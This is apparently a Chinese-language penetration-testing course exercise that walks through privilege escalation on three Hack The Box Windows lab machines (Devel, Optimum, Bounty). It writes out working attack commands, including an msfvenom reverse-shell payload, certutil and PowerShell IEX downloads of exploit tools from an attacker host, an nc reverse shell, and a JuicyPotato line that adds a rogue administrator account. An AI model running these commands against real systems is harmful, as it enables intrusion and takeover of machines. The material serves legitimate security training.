# 練習 D — 3 台 Windows 靶機

> 目標：在 3 台 HTB Windows 機器上，從初始立足到 SYSTEM，練習 Ch 25–29 的各種提權技術。

## 練習說明

提權前都要做完整枚舉：
1. `whoami /all`（第一步）
2. 手動收集清單（Ch 25）
3. winPEAS
4. PowerUp（如果有 PowerShell）

每台機器做完後要有截圖：`whoami`（初始）、`whoami`（SYSTEM）、`proof.txt` + `ipconfig`。

## 三台目標機器

| 機器 | OS | 提權技術 |
|------|-----|---------|
| **Devel** | Windows 7 | MS11-046（核心）或 JuicyPotato |
| **Optimum** | Windows Server 2012 | MS16-032（本地提權） |
| **Bounty** | Windows Server 2008 R2 | JuicyPotato + SeImpersonate |

## 機器一：Devel（Windows 7，FTP + IIS）

```cmd
TARGET=10.10.10.5

# Step 1：枚舉
nmap -p- --min-rate 5000 $TARGET
# 開 21, 80（FTP 和 IIS）

# Step 2：FTP 匿名登入，看到 IIS 根目錄
ftp 10.10.10.5
# anonymous:anonymous
# ls → wwwroot 內容

# Step 3：上傳 webshell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o shell.aspx
ftp> put shell.aspx

# Step 4：觸發 shell
# 訪問 http://10.10.10.5/shell.aspx

# Step 5：whoami /priv
# 找 SeImpersonatePrivilege
whoami /priv

# Step 6：提權
# Windows 7 → JuicyPotato 或 MS11-046
```

<details>
<summary>Devel 提權解法</summary>

`whoami /all` 顯示 `iis apppool\web` 帳號有 `SeImpersonatePrivilege`。

選項一：JuicyPotato（Windows 7）

```cmd
certutil -urlcache -f http://10.10.14.5/JuicyPotato.exe C:\Windows\Temp\jp.exe
certutil -urlcache -f http://10.10.14.5/nc.exe C:\Windows\Temp\nc.exe
C:\Windows\Temp\jp.exe -t * -p "C:\Windows\Temp\nc.exe" -a "-e cmd.exe 10.10.14.5 5555" -l 9999 -c {CLSID}
```

Windows 7 x64 的 CLSID 要查網站（ohpe.it/juicy-potato/CLSID/）。

選項二：MS11-046（核心）

```bash
searchsploit ms11-046
# 找到 40564.c，編譯後上傳
```

</details>

## 機器二：Optimum（Windows Server 2012，HFS）

```bash
TARGET="10.10.10.8"

# Step 1：枚舉
nmap -p 80 -sC -sV $TARGET
# HFS 2.3（HTTP File Server）

# Step 2：找 HFS 漏洞
searchsploit hfs 2.3
# 有 RCE exploit

# Step 3：取得初始 shell（Powershell 反彈）
# exploit 利用 HFS 的模板注入跑任意指令

# Step 4：提權枚舉
whoami /priv
systeminfo | findstr /b /c:"OS Name" /c:"OS Version"
# Windows Server 2012 R2
```

<details>
<summary>Optimum 提權解法</summary>

`systeminfo` 顯示 Windows Server 2012 R2。

用 Windows Exploit Suggester（wesng）或 Sherlock.ps1：

```powershell
# 在靶機
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/Sherlock.ps1')
Find-AllVulns
```

發現 MS16-032，這是 Secondary Logon Service 的提權漏洞。

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/MS16-032.ps1')
Invoke-MS16-032
```

</details>

## 機器三：Bounty（Windows Server 2008 R2，IIS WebDAV）

```bash
TARGET="10.10.10.93"

# Step 1：枚舉
nmap -p 80 -sC -sV $TARGET
# IIS 7.5，有 WebDAV

# Step 2：WebDAV 枚舉
davtest -url http://$TARGET
# 看哪些副檔名可以 PUT 和執行

# Step 3：上傳 ASPX webshell（需要繞過副檔名限制）
# WebDAV 可以 PUT .config 檔
# web.config 可以設定 ASP handler

# web.config 內容（讓 .jpg 以 ASP 方式執行）
# 上傳後再上傳 cmd.jpg（ASPX 內容）

# Step 4：取得初始 shell
# 上傳反彈 shell 的 aspx 並訪問

# Step 5：提權
whoami /priv
# 確認有 SeImpersonatePrivilege
```

<details>
<summary>Bounty 提權解法</summary>

初始 shell 是 `merlin`（IIS AppPool），有 `SeImpersonatePrivilege`。

Windows 2008 R2 → JuicyPotato：

```cmd
certutil -urlcache -f http://10.10.14.5/JuicyPotato.exe C:\Windows\Temp\jp.exe

# Windows Server 2008 R2 的一個常用 CLSID
C:\Windows\Temp\jp.exe -t * -p cmd.exe -a "/c net user hacker P@ssword /add && net localgroup administrators hacker /add" -l 9999 -c {e60687f7-01a1-40aa-86ac-db1cbf673334}

# 確認
net localgroup administrators
```

然後用 psexec 或 SMB 以 hacker 帳號登入，取得 SYSTEM 等級。

</details>

## 提權工具準備清單

考試前確保 `~/tools/` 裡有：

```bash
ls ~/tools/
# winPEASany.exe
# PowerUp.ps1
# JuicyPotato.exe
# PrintSpoofer64.exe
# GodPotato-NET4.exe
# nc.exe
# Seatbelt.exe
# Sherlock.ps1
# watson.exe（替代 Sherlock）
```

## 完成標準

| 機器 | 截圖要求 |
|------|---------|
| Devel | whoami（初始 iis apppool）+ whoami（nt authority\system）+ proof.txt + ipconfig |
| Optimum | whoami（初始）+ whoami（system）+ proof.txt + ipconfig |
| Bounty | whoami（初始）+ whoami（system）+ proof.txt + ipconfig |

## 自我檢核

- [ ] 3 台機器都取得 SYSTEM
- [ ] Devel 用 SeImpersonatePrivilege 提權（Potato 系列）
- [ ] Optimum 用 Windows Exploit Suggester 找到 kernel exploit
- [ ] Bounty 用 JuicyPotato 提權
- [ ] 每台機器都有完整截圖

→ [Ch 30 AD 基礎：Domain / Forest / Kerberos / LDAP](./30-ad-fundamentals.md)
